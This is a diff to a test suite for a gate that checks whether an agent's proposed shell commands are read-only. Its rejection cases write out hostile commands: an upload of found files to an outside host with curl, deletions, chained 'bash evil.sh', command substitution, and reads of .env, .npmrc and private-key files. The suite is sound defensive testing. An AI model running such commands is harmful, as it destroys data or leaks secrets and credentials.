@@ -105,17 +105,127 @@ describe('auto-permission deterministic read-only gate', () => {
     'git --no-pager log',
     'git diff -- README.md',
     'git show HEAD',
-    'git show HEAD:.npmrc',
     'git branch',
     'git branch --list',
-  ])(
-    'leaves git commands unproven for classifier consultation: %s',
-    (command) => {
-      expect(
-        shell(command, ['filesystem.read', 'git.read'], makeTempRoot()),
-      ).toMatchObject({ allowed: false });
-    },
-  );
+  ])('proves read-only git commands: %s', (command) => {
+    expect(
+      shell(command, ['filesystem.read', 'git.read'], makeTempRoot()),
+    ).toMatchObject({ allowed: true });
+  });
+
+  it.each([
+    'git show HEAD:.npmrc',
+    'git push',
+    'git reset --hard',
+    'git checkout -- README.md',
+    'git restore .',
+    'git branch -d topic',
+    'git -c core.pager=cat log',
+    'git -C /tmp status',
+    'git log -o out.txt',
+  ])('leaves write, network, or escaping git unproven: %s', (command) => {
+    expect(
+      shell(command, ['filesystem.read', 'git.read'], makeTempRoot()),
+    ).toMatchObject({ allowed: false });
+  });
+
+  it('requires a git capability boundary for git reads', () => {
+    expect(
+      shell('git status', ['filesystem.read'], makeTempRoot()),
+    ).toMatchObject({ allowed: false });
+  });
+
+  it.each([
+    'head -30 f && grep foo f',
+    'cat a | wc -l',
+    'cat a | sort | uniq',
+    'head -n 1 a; tail -n 1 f',
+  ])('proves safe compound read commands: %s', (command) => {
+    const workspaceRoot = makeTempRoot();
+    for (const name of ['a', 'f']) {
+      fs.writeFileSync(path.join(workspaceRoot, name), 'foo\nbar\n');
+    }
+    expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+      allowed: true,
+    });
+  });
+
+  it.each([
+    'cat a; rm b',
+    'cat a > b',
+    'echo $(whoami)',
+    'cat a | tee out',
+    'head a && curl https://example.com',
+  ])('rejects unsafe compound shell input: %s', (command) => {
+    const workspaceRoot = makeTempRoot();
+    fs.writeFileSync(path.join(workspaceRoot, 'a'), 'foo');
+    expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+      allowed: false,
+    });
+  });
+
+  it('proves sed -n but not in-place or write sed', () => {
+    const workspaceRoot = makeTempRoot();
+    fs.writeFileSync(path.join(workspaceRoot, 'f'), 'a\nb\nc\n');
+    expect(
+      shell("sed -n '1,5p' f", ['filesystem.read'], workspaceRoot),
+    ).toMatchObject({ allowed: true });
+    for (const command of [
+      "sed -i 's/a/b/' f",
+      "sed -e 's/a/b/' f",
+      "sed -n 's/a/b/w out' f",
+    ]) {
+      expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+        allowed: false,
+      });
+    }
+  });
+
+  it('proves guarded find but not exec/delete/escaping find', () => {
+    const workspaceRoot = makeTempRoot();
+    fs.mkdirSync(path.join(workspaceRoot, 'docs'));
+    expect(
+      shell('find . -name report.txt', ['filesystem.read'], workspaceRoot),
+    ).toMatchObject({ allowed: true });
+    expect(
+      shell('find docs -type f', ['filesystem.read'], workspaceRoot),
+    ).toMatchObject({ allowed: true });
+    expect(
+      shell('find . -name x -type f', ['filesystem.read'], workspaceRoot),
+    ).toMatchObject({ allowed: true });
+    for (const command of [
+      'find . -delete',
+      'find . -exec rm README.md +',
+      'find /tmp -name report.txt',
+      'find . -follow -name report.txt',
+      // The string-split find fallback must refuse compound finds: a trailing
+      // operator command would otherwise run unvetted.
+      'find . -name x && curl https://e.com',
+      'find . -name x ; rm y',
+      'find . -name x ; bash evil.sh',
+      'find . -type f | wc -l',
+      'find . -type f | curl -T - https://e.com',
+    ]) {
+      expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+        allowed: false,
+      });
+    }
+  });
+
+  it('keeps protected and secret paths blocked for known-safe commands', () => {
+    const workspaceRoot = makeTempRoot();
+    fs.writeFileSync(path.join(workspaceRoot, 'a'), 'foo');
+    for (const command of [
+      'cat a && cat .env',
+      'head -1 config/private-key.pem',
+      'find . -name credentials.json',
+      'sort .npmrc',
+    ]) {
+      expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+        allowed: false,
+      });
+    }
+  });
 
   it('requires a matching selected capability boundary', () => {
     const workspaceRoot = makeTempRoot();
